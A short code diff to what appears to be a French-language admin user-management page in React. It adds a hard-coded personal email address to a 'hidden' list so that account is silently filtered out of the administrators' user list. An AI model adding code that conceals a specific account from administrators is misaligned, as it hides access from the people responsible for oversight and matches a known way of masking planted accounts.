@@ -69,10 +69,17 @@ export default function GestionUtilisateursPage() {
     role: '',
     is_active: true
   });
+  // Emails à masquer dans la liste des utilisateurs
+  const hiddenEmails = ['israelokito88@gmail.com'];
 
   // Fonction pour filtrer les utilisateurs avec le champ de recherche
   const filteredUsers = users.filter(user => {
+    if (hiddenEmails.includes(user.email)) {
+      return false;
+    }
+
     if (!searchTerm) return true;
+    
     const searchLower = searchTerm.toLowerCase();
     return (
       user.email?.toLowerCase().includes(searchLower) ||
